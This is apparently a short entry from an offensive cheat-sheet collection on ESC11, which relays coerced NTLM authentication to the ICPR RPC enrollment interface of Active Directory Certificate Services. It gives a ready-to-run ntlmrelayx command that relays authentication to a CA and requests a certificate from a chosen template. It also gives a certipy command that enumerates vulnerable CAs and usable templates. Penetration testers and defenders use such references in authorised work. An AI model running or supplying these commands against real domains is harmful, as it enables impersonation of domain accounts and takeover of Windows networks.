---
technique: ESC11 - NTLM Relay to ICPR RPC
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc11 certificate-services pkinit
---

# ESC11 - NTLM Relay to ICPR RPC

ESC11 relays coerced NTLM authentication to the ICPR RPC enrollment interface when request encryption is not enforced.

## Linux

### ntlmrelayx: ESC11 RPC endpoint relay

#python #ntlmrelayx #ntlm-relay #rpc #icpr

Relay to the ICPR RPC interface when IF_ENFORCEENCRYPTICERTREQUEST is absent; specify the CA name with -icpr-ca-name and use -rpc-mode ICPR.

```sh title:"ESC11: relay coerced NTLM to ICPR RPC enrollment endpoint"
ntlmrelayx.py -t rpc://$ca_fqdn -rpc-mode ICPR -icpr-ca-name $ca_name --smb2support --template "$template_name"
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
var template_name
-->

### certipy: enumerate ESC8 and ESC11 CAs

#certipy #enum

Find CAs vulnerable to ESC8 or ESC11 and list enabled auth templates suitable for use with the relay.

```sh title:"ESC8/ESC11: find vulnerable CAs and usable templates"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->
